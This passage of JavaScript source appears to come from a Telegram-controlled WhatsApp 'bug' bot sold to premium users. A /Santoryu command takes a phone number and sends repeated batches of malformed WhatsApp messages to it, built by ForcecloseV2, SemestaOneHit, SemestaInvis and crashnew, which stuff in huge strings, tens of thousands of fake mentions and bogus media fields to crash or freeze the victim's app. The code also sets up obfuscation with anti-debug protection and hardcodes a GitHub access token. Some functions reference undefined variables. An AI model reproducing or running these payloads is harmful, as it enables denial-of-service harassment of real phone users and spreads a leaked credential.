  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Akses
┃Owner: @fanzdevv
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/fanzdevv" }],
          [
            { text: "Channel", url: "https://t.me/AboutFanzz" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber) {
    return bot.sendMessage(chatId, `⚠️ *Invalid Input*\n\nUse format: /Santoryu 62xxxxxxxxxx`, {
      parse_mode: "Markdown"
    });
  }

  const sent = await bot.sendVideo(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ ACTIVE : ${sessions.size}
│ STATUS : Loading Bug Combo
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    await new Promise(r => setTimeout(r, 1200));

    await bot.editMessageCaption(`
╭─「 Lock Device WhatsApp 」─╮
│SIGNAL : Bug Combo
│STATUS : SEND TO TARGET
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });

    await bot.editMessageCaption(`
╭─「 SUCCESSFULLY SEND 」─╮
│STATUS : Bug Combo
│OWNERS : @fanzdevv
╰─────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }],
          [{ text: "KEMBALI", callback_data: "back" }]
        ]
      }
    });

    // Jalankan Function
    for (let i = 0; i < 100; i++) {
    await ForcecloseV2(sock, target);
    await SemestaOneHit(sock, target);
    await SemestaInvis(sock, target);
    await crashnew(sock, target);
    await new Promise(resolve => setTimeout(resolve, 1000));
    }

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `Xerovang${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};


// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "🔥 Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© Hunters Enc Bot一緒_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}
//FUNCTION MU

// END FUNCTION 

//DATABAS SAMAIN DI SC NYA
try {
  const { Octokit } = (await import("@octokit/rest"));

  const GITHUB_TOKEN = "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";
  const GITHUB_REPO = "fanzzgg/Kwontol";
  const [GH_OWNER, GH_REPO] = GITHUB_REPO.split("/");
  const octokit = new Octokit({ auth: GITHUB_TOKEN });

  const FILES = {
    token: "tokens.json",
    reseller: "resellers.json",
    mod: "mods.json",
    owner: "owners.json",
  };

  function isDev(userId) {
    const idStr = String(userId);
    const owners = (global.config && Array.isArray(global.config.OWNER_ID)) ? global.config.OWNER_ID : [];
    return owners.includes(idStr);
  }

  async function getFileContent(filePath) {
    try {
      const { data } = await octokit.repos.getContent({ owner: GH_OWNER, repo: GH_REPO, path: filePath });
      const content = Buffer.from(data.content, "base64").toString();
      return { content: JSON.parse(content), sha: data.sha };
    } catch (e) {
      if (e.status === 404) {
        const emptyArr = [];
        const resp = await octokit.repos.createOrUpdateFileContents({
          owner: GH_OWNER, repo: GH_REPO, path: filePath,
          message: `init ${filePath}`,
          content: Buffer.from(JSON.stringify(emptyArr, null, 2)).toString("base64"),
          committer: { name: "bot", email: "bot@example.com" },
          author: { name: "bot", email: "bot@example.com" },
        });
        return { content: [], sha: resp.data.content.sha };
      }
      throw e;
    }
  }

  async function updateFileContent(filePath, json, sha, committer = { name: "bot", email: "bot@example.com" }) {
    await octokit.repos.createOrUpdateFileContents({
      owner: GH_OWNER, repo: GH_REPO, path: filePath,
      message: `Update ${filePath}`,
      content: Buffer.from(JSON.stringify(json, null, 2)).toString("base64"),
      sha,
      committer, author: committer,
    });
  }

  async function isAuthorized(id, types = []) {
    const idStr = String(id);
    for (const type of types) {
      const file = FILES[type];
      const { content } = await getFileContent(file);
      if (Array.isArray(content) && content.includes(idStr)) return true;
    }
    return false;
  }

  async function addUser(role, userId, allowedBy) {
    const matrix = {
      token: ["reseller", "mod", "owner"],
      reseller: ["mod", "owner"],
      mod: ["owner"],
      owner: [],
    };
    const allowedTypes = matrix[role] || [];
    if (!isDev(allowedBy) && !(await isAuthorized(allowedBy, allowedTypes))) return "Tidak punya izin.";

    const file = FILES[role];
    const { content, sha } = await getFileContent(file);
    const userIdStr = String(userId);
    if (content.includes(userIdStr)) return "User sudah terdaftar.";
    content.push(userIdStr);
    await updateFileContent(file, content, sha);
    return `Berhasil menambahkan ${userIdStr} ke ${role}`;
  }

  async function removeUser(role, userId, allowedBy) {
    const matrix = {
      token: ["reseller", "mod", "owner"],
      reseller: ["mod", "owner"],
      mod: ["owner"],
      owner: [],
    };
    const allowedTypes = matrix[role] || [];
    if (!isDev(allowedBy) && !(await isAuthorized(allowedBy, allowedTypes))) return "Tidak punya izin.";

    const file = FILES[role];
    const { content, sha } = await getFileContent(file);
    const userIdStr = String(userId);
    if (!content.includes(userIdStr)) return "User tidak ditemukan.";
    const updated = content.filter((u) => u !== userIdStr);
    await updateFileContent(file, updated, sha);
    return `Berhasil menghapus ${userIdStr} dari ${role}`;
  }

  function extractTextFromMessage(msg) {
    try {
      const m = msg.message || {};
      if (m.conversation) return m.conversation;
      if (m.extendedTextMessage && m.extendedTextMessage.text) return m.extendedTextMessage.text;
      if (m.imageMessage && m.imageMessage.caption) return m.imageMessage.caption;
      if (m.videoMessage && m.videoMessage.caption) return m.videoMessage.caption;
      return "";
    } catch { return ""; }
  }

  function jidToBareId(jid) {
    // "628xx@s.whatsapp.net" -> "628xx"
    return String(jid).split("@")[0];
  }

  async function isMemberGroup(sock, jid, userJid) {
    try {
      const meta = await sock.groupMetadata(jid);
      const uid = String(userJid);
      return meta.participants.some(p => p.id === uid);
    } catch {
      // Kalau bukan grup, anggap false
      return false;
    }
  }

  function parseCmd(line) {
    const text = (line || "").trim();
    const m = text.match(/^([./!#])([a-zA-Z]+)(?:\s+(.+))?$/);
    if (!m) return null;
    return { cmd: m[2].toLowerCase(), args: (m[3] || "").trim() };
  }

  async function handleRoleCommand(sock, chatJid, senderJid, parsed) {
    const fromId = jidToBareId(senderJid);
    const inGroup = await isMemberGroup(sock, chatJid, senderJid);
    if (!inGroup) {
      await sock.sendMessage(chatJid, { text: "❌ Kamu bukan anggota group!" });
      return;
    }

    const reply = async (t) => sock.sendMessage(chatJid, { text: t });

    const args = parsed.args;
    switch (parsed.cmd) {
      case "addtoken": {
        const id = args;
        if (!id) return reply("⚠️ Format: `/addtoken <Token>`");
        const res = await addUser("token", id, fromId);
        return reply(res);
      }
      case "deltoken": {
        const id = args;
        if (!id) return reply("⚠️ Format: `/deltoken <Token>`");
        const res = await removeUser("token", id, fromId);
        return reply(res);
      }
      case "addreseller": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/addreseller <user_id>`");
        const id = raw.replace(/\D/g, ""); // ambil digit saja
        const res = await addUser("reseller", id, fromId);
        return reply(res);
      }
      case "delreseller": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/delreseller <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await removeUser("reseller", id, fromId);
        return reply(res);
      }
      case "addmod": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/addmod <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await addUser("mod", id, fromId);
        return reply(res);
      }
      case "delmod": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/delmod <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await removeUser("mod", id, fromId);
        return reply(res);
      }
      case "addowner": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/addowner <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await addUser("owner", id, fromId);
        return reply(res);
      }
      case "delowner": {
        const raw = args;
        if (!raw) return reply("⚠️ Format: `/delowner <user_id>`");
        const id = raw.replace(/\D/g, "");
        const res = await removeUser("owner", id, fromId);
        return reply(res);
      }
      default: return;
    }
  }

  if (!global.__GITHUB_ROLE_CMDS_PATCHED__) {
    global.__GITHUB_ROLE_CMDS_PATCHED__ = true;

    const sessions = (global.sessions && typeof global.sessions.get === "function") ? global.sessions : null;

    function attachToSock(sock) {
      if (!sock || sock.__roleHandlerAttached) return;
      sock.__roleHandlerAttached = true;
      try {
        sock.ev.on("messages.upsert", async (m) => {
          try {
            const up = m;
            const msgs = (up && up.messages) ? up.messages : [];
            for (const message of msgs) {
              if (!message.message) continue;
              const chatJid = message.key.remoteJid;
              const senderJid = message.key.participant || message.key.remoteJid;
              const text = extractTextFromMessage(message);
              const parsed = parseCmd(text);
              if (!parsed) continue;
              await handleRoleCommand(sock, chatJid, senderJid, parsed);
            }
          } catch (err) {
            console.error("[role-cmd] error:", err);
          }
        });
      } catch (err) {
        console.error("[role-cmd] attach error:", err);
      }
    }

    if (sessions && typeof sessions.forEach === "function") {
      try {
        sessions.forEach((s) => attachToSock(s));
      } catch {}
    }

    setInterval(() => {
      try {
        if (sessions && typeof sessions.forEach === "function") {
          sessions.forEach((s) => attachToSock(s));
        }
        if (global.sock) attachToSock(global.sock);
      } catch {}
    }, 3000);
  }

} catch (err) {
  console.warn("[Octokit Role DB] modul tidak aktif:", err && err.message);
}
})();

//FUNC MELDAK
async function SemestaInvis(target) {
  const Zunn = {
  viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "SEMESTA - DELAY"+ 
                 "@0@1".repeat(3000),
            format: "DEFAULT",
            contextInfo: {
              mentionedJid: [
                target,
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING"
              },
            }
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{".repeat(5000) + "}".repeat(5000), 
            version: 3
          }
        }
      }
    }
  };
  const Leomord = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: parse,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: mentionedList,
              isForwarded: parse,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "999999@newsletter",
                serverMessageId: 1,
                newsletterName: "X"
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };
  const cursed = {
   interactiveResponseMessage: {
          body: {
            text: "INVIS DECK",
            format: "EXTENTION_1",
          },
          nativeFlowResponseMessage: {
            name: "review_and_pay",
            paramsJson: "\x10".repeat(5000),
            version: 4,
          },
          contextInfo: {
            participant: target,
            stanzaId: "status@broadcast",
            mentionedJid: ["181818181818@s.whatsapp.net"],
            forwardingScore: 888,
            isForwarded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: "111111111111@s.whatsapp.net",
            },
            quotedMessage: {
              callLogMessage: {
                isVideo: true,
                callOutCome: 1,
                duration: 135,
                participantIds: [],
              },
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "12345678@newsletter",
              newsletterName: "BLANK AHOOL SILENCE",
              contentType: "UPDATE",
              serverMessageId: 2,
             }
           }
         }
       };
    const docu = {
     interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo="),
                        fileLength: "9999999999999",
                        pageCount: 1316134911,
                        mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec="),
                        fileName: "YxG - Yogja" + "𑜦𑜠".repeat(25000),
                        fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo="),
                        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1726867151",
                        contactVcard: false,
                        jpegThumbnail: null,
                    }
                },
                body: { text: "ꦾ".repeat(10000) },
                contextInfo: {
                    stanzaId: ")palembang_id",
                    forwardingScore: 999,
                    participant: target,
                    mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                }
            }
        };
    for (const msg of [Zunn, Leomord, cursed, docu]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(`SEMESTA - INVIS SUCCES SEND TARGET ${target}`);
  }
}

async function SemestaOneHit(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    buttonsMessage: {
        contentText: "SEMESTA - JAYA",
        footerText: "\u0000",
        buttons: [
          {
            buttonId: "KenalZunGaBg?",
            buttonText: { 
              displayText: "\n".repeat(9000),
            },
            type: 1,
          },
        ],
        headerType: 1,
        contextInfo: {
        participant: target,
        mentionedJid: [
          "131338822@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
            },
          },
        },
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
          fileLength: "289511",
          seconds: 15,
          mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
          caption: "\u0000".repeat(104500),
          height: 640,
          width: 640,
          fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
          directPath:
      "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1743848703",
          contextInfo: {
            participant: target,
            remoteJid: "X",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              "131338822@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
          },
          streamingSidecar:
      "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
          thumbnailDirectPath:
      "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
          thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
          thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
          annotations: [
            {
              embeddedContent: {
                X,
              },
              embeddedAction: true,
            },
          ],
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    }
  );
 const DelayIn = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            mimetype: "image/jpeg",
            caption: "",
            fileLength: "9999999999999",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            height: 1,
            width: 1,
            jpegThumbnail: Buffer.from("").toString("base64"),
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "BULLDOZER - SEMESTA JAYA ▾" },
            footer: { text: "Buy pt? Pv" },
            nativeFlowMessage: { messageParamsJson: corruptedJson },
            contextInfo: {
              mentionedJid: mention40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };
    const payload = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "ZunnFlow", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        },
      },
    },
  };

const msg2 = {
   interactiveResponseMessage: {
          body: {
            text: "maklo",
            format: "EXTENTION_1",
          },
          nativeFlowResponseMessage: {
            name: "review_and_pay",
            paramsJson: "\x10".repeat(5000),
            version: 4,
          },
          contextInfo: {
            participant: target,
            stanzaId: "status@broadcast",
            mentionedJid: ["181818181818@s.whatsapp.net"],
            forwardingScore: 888,
            isForwarded: true,
            businessMessageForwardInfo: {
              businessOwnerJid: "111111111111@s.whatsapp.net",
            },
            quotedMessage: {
              callLogMessage: {
                isVideo: true,
                callOutCome: 1,
                duration: 135,
                participantIds: [],
              },
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "999999999@newsletter",
              newsletterName: "Bokep Mas?",
              contentType: "UPDATE",
              serverMessageId: 2,
             }
           }
         }
       };
    const Junzz = {
     interactiveMessage: {
                header: {
                    hasMediaAttachment: true,
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: Buffer.from("QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo="),
                        fileLength: "9999999999999",
                        pageCount: 1316134911,
                        mediaKey: Buffer.from("45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec="),
                        fileName: "BlankFile" + "𑜦𑜠".repeat(25000),
                        fileEncSha256: Buffer.from("LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo="),
                        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1726867151",
                        contactVcard: false,
                        jpegThumbnail: null,
                    }
                },
                body: { text: "ꦾ".repeat(10000) },
                contextInfo: {
                    stanzaId: "metawai_id",
                    forwardingScore: 999,
                    participant: target,
                    mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                }
            }
        };
    for (const msg of [msg, DelayIn, msg2, Junzz]) {
    await sock.relayMessage("status@broadcast", msg.message ?? msg, {
      messageId: msg.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });
    console.log(chalk.red(`SEMESTA - JAYA SUCCES SENDING BULLDO BLANK ${target}`));
  }
}

async function ForcecloseV2(sock, target) {
  const msg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            locationMessage: {
              degreesLatitude: 0,
              degreesLongitude: 0,
              name: "\u2060",
              address: "\u0000\u200E\u202E\u2060\u200B".repeat(20000)
            },
            hasMediaAttachment: false
          },
          body: {
            text: "☠️ X-BLASTER VORTEX ☠️",
            format: "DEFAULT"
          },
          footer: {
            text: "\u0007".repeat(3000)
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: Array.from({ length: 20 }, (_, i) => ({
              name: "btn_" + i,
              buttonParamsJson: "\u0000\u200B\u202E".repeat(6000)
            }))
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              Math.floor(Math.random() * 1e16).toString() + "@s.whatsapp.net"
            ),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/FAKE_DEAD_URL_MUTATED.mp4?fail=true",
                    mimetype: "video/mp4",
                    fileSha256: Buffer.alloc(32),
                    fileLength: "9999999999",
                    seconds: 999999,
                    mediaKey: Buffer.alloc(32),
                    height: 9999,
                    width: 9999,
                    fileEncSha256: Buffer.alloc(32),
                    directPath: "/v/t62/invalid/fail/null_" + "\u202E".repeat(1000),
                    mediaKeyTimestamp: "9999999999",
                    jpegThumbnail: Buffer.from([]),
                    streamingSidecar: Buffer.alloc(3000).toString("base64")
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {});
  console.log(`✅ ZoroForce terkirim ke ${target}`);
}

async function crashnew(target) {
  const payload = {
    contextInfo: {
      mentionedJid: [undefined, null],
      forwardingScore: -9999,
      isForwarded: true,
      participant: null,
      remoteJid: undefined,
      quotedMessage: {
        conversation: "\u0000".repeat(9999999)
      }
    }
  }
  await pnx.relayMessage(target, {
    albumMessage: {
      caption: " ─ daldzavgrs. ",
      mediaCount: -99999999,
      firstMedia: {},
      contextInfo: payload.contextInfo
    }
  }, { messageId: "alb_" + Date.now(), participant: null });
  await pnx.relayMessage(target, {
    contactMessage: {
      displayName: "\u0000".repeat(50000),
      vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:\nTEL;waid=666666666666:\nEND:VCARD",
      contextInfo: payload.contextInfo
    }
  }, { messageId: "ctc_" + Date.now(), participant: null });
  await pnx.relayMessage(target, {
    nativeFlowMessage: {
      buttons: [],
      messageParamsJson: "{[(".repeat(10000),
      flowToken: "",
      content: {
        namespace: "",
        locale: "",
        fallbackLg: "",
        fallbackLc: "",
        title: "DALDZZ_TRIGGER",
        description: "\u0000".repeat(10000),
        buttonText: "\u0000".repeat(10000),
      },
      contextInfo: payload.contextInfo
    }
  }, { messageId: "flw_" + Date.now(), participant: null });
  await pnx.relayMessage(target, {
    viewOnceMessage: {
      message: {
        imageMessage: {
          caption: " ─ daldzavgrs. ",
          jpegThumbnail: Buffer.alloc(1),
          contextInfo: payload.contextInfo
        }
      }
    }
  }, { messageId: "vom_" + Date.now(), participant: null });
  await pnx.sendMessage(target, {
    text: "",
    contextInfo: payload.contextInfo
  });
}
///END SELESAI